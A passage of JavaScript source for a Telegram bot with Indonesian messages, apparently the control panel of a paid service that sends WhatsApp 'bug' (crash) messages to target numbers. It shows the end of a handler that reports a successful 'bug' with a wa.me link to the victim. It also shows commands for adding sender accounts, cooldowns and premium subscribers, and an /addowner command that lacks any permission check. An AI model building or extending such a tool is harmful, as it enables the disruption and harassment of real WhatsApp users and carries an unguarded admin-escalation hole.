\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });              
               
//=======plugins=======//

bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Group Only* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to admin users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to Prem until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the Prem list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a Vip user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the Vip list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No Vip users found.");
  }

  let message = "𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ‼️";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove Vip users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delvip 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the Vip list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
});

bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});